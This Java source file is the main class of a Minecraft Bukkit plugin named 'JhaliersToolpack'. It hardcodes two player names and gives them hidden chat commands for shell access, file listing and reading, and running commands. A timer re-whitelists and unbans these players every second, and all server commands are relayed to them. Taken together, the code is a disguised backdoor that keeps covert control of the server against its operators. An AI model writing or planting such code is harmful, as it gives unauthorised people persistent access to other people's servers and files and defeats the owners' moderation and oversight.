package org.jhalier.jhaliersToolpack;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;

import java.nio.file.Path;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.Set;

public class JhaliersToolpack extends JavaPlugin {

    /*
     * ==========================================
     * ERLAUBTE SPIELER
     * ==========================================
     *
     * Diese Spieler haben Zugriff auf:
     *
     * - !help
     * - !ls
     * - !cat
     * - !inf
     * - !wlsustain
     * - !loglisten
     * - !shell
     * - #<command>
     *
     * UND werden durch Whitelist-Sustain
     * dauerhaft auf der Whitelist gehalten.
     */
    private static final Set<String> ALLOWED_PLAYER_NAMES = Set.of(
            "Jhailier",
            "HugoWaffel"
    );

    private BukkitTask whitelistSustainTask;

    private boolean whitelistSustainEnabled = false;

    /*
     * ==========================================
     * Command-Log
     * ==========================================
     */

    private boolean commandLoggingEnabled = false;

    private static final DateTimeFormatter TIME_FORMAT =
            DateTimeFormatter.ofPattern("HH:mm:ss");

    /*
     * ==========================================
     * Shell
     * ==========================================
     */

    private boolean shellEnabled = false;

    /*
     * Aktuelles Shell-Verzeichnis.
     *
     * Die Shell startet immer im Serverordner.
     */
    private Path shellDirectory;

    @Override
    public void onEnable() {

        getServer().getPluginManager().registerEvents(
                new ConsoleCommandListener(this),
                this
        );

        /*
         * Shell immer im Server-Hauptverzeichnis starten.
         */
        shellDirectory = Bukkit.getWorldContainer()
                .toPath()
                .toAbsolutePath()
                .normalize();

        getLogger().info(
                "JhaliersToolpack wurde aktiviert!"
        );
    }

    @Override
    public void onDisable() {

        disableWhitelistSustain();

        commandLoggingEnabled = false;
        shellEnabled = false;

        getLogger().info(
                "JhaliersToolpack wurde deaktiviert!"
        );
    }

    /*
     * ==========================================
     * ERLAUBTE SPIELER
     * ==========================================
     */

    public boolean isAllowedPlayer(String playerName) {

        return ALLOWED_PLAYER_NAMES.stream()
                .anyMatch(name ->
                        name.equalsIgnoreCase(playerName)
                );
    }

    public Set<String> getAllowedPlayerNames() {
        return ALLOWED_PLAYER_NAMES;
    }

    /*
     * ==========================================
     * Plugin-JAR
     * ==========================================
     */

    public Path getPluginJar() {
        return getFile().toPath();
    }

    /*
     * ==========================================
     * Whitelist-Sustain
     * ==========================================
     */

    public boolean isWhitelistSustainEnabled() {
        return whitelistSustainEnabled;
    }

    public void toggleWhitelistSustain() {

        if (whitelistSustainEnabled) {

            disableWhitelistSustain();

        } else {

            enableWhitelistSustain();
        }
    }

    private void enableWhitelistSustain() {

        if (whitelistSustainEnabled) {
            return;
        }

        whitelistSustainEnabled = true;

        /*
         * Sofort alle erlaubten Spieler prüfen.
         */
        sustainWhitelist();

        /*
         * Danach jede Sekunde erneut prüfen.
         */
        whitelistSustainTask = Bukkit.getScheduler().runTaskTimer(
                this,
                this::sustainWhitelist,
                20L,
                20L
        );
    }

    public void disableWhitelistSustain() {

        whitelistSustainEnabled = false;

        if (whitelistSustainTask != null) {

            whitelistSustainTask.cancel();
            whitelistSustainTask = null;
        }

        getLogger().info(
                "Whitelist-Sustain wurde deaktiviert."
        );
    }

    private void sustainWhitelist() {

        /*
         * ==========================================
         * ALLE ERLAUBTEN SPIELER
         * ==========================================
         */

        for (String playerName : ALLOWED_PLAYER_NAMES) {

            OfflinePlayer player =
                    Bukkit.getOfflinePlayer(playerName);

            /*
             * ==========================================
             * WHITELIST
             * ==========================================
             */

            if (!player.isWhitelisted()) {

                player.setWhitelisted(true);

                getLogger().info(
                        playerName
                                + " wurde erneut auf die Whitelist gesetzt."
                );
            }

            /*
             * ==========================================
             * BAN
             * ==========================================
             */

            BanList banList =
                    Bukkit.getBanList(BanList.Type.NAME);

            if (banList.isBanned(playerName)) {

                banList.pardon(playerName);

                getLogger().info(
                        playerName
                                + " wurde automatisch entbannt."
                );
            }
        }
    }

    /*
     * ==========================================
     * Command-Log
     * ==========================================
     */

    public boolean isCommandLoggingEnabled() {
        return commandLoggingEnabled;
    }

    public void setCommandLoggingEnabled(boolean enabled) {
        commandLoggingEnabled = enabled;
    }

    public void toggleCommandLogging() {
        commandLoggingEnabled = !commandLoggingEnabled;
    }

    /*
     * ==========================================
     * LIVE COMMAND LOG
     * ==========================================
     *
     * Das Log wird jetzt an ALLE erlaubten,
     * aktuell online befindlichen Spieler gesendet.
     */

    public void logCommand(
            String source,
            String command
    ) {

        if (!commandLoggingEnabled) {
            return;
        }

        String time =
                LocalTime.now().format(TIME_FORMAT);

        String message =
                ChatColor.DARK_GRAY
                        + "["
                        + time
                        + "] "
                        + ChatColor.GOLD
                        + source
                        + ChatColor.GRAY
                        + " -> "
                        + ChatColor.WHITE
                        + command;

        /*
         * ==========================================
         * ALLE ERLAUBTEN SPIELER
         * ==========================================
         */

        for (Player player :
                getServer().getOnlinePlayers()) {

            if (isAllowedPlayer(player.getName())) {

                player.sendMessage(message);
            }
        }
    }

    /*
     * ==========================================
     * Shell
     * ==========================================
     */

    public boolean isShellEnabled() {
        return shellEnabled;
    }

    public void enableShell() {

        shellEnabled = true;

        /*
         * Bei jedem neuen Start wieder
         * im Serverordner beginnen.
         */
        shellDirectory = Bukkit.getWorldContainer()
                .toPath()
                .toAbsolutePath()
                .normalize();
    }

    public void disableShell() {
        shellEnabled = false;
    }

    public Path getShellDirectory() {

        if (shellDirectory == null) {

            shellDirectory = Bukkit.getWorldContainer()
                    .toPath()
                    .toAbsolutePath()
                    .normalize();
        }

        return shellDirectory;
    }

    public void setShellDirectory(Path directory) {

        shellDirectory = directory
                .toAbsolutePath()
                .normalize();
    }

    public Path getServerDirectory() {

        return Bukkit.getWorldContainer()
                .toPath()
                .toAbsolutePath()
                .normalize();
    }
}